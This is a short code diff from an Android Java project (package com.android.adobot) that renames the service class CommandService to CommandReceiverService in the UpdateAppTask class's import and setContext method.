@@ -7,7 +7,7 @@ import android.os.Environment;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandService;
+import com.android.adobot.CommandReceiverService;
 import com.android.adobot.CommonParams;
 import com.android.adobot.activities.UpdateActivity;
 
@@ -38,7 +38,7 @@ public class UpdateAppTask extends BaseTask {
         }
     }
 
-    public void setContext(CommandService c) {
+    public void setContext(CommandReceiverService c) {
         super.setContext(c);
         context = c;
         this.commonParams = new CommonParams(c);
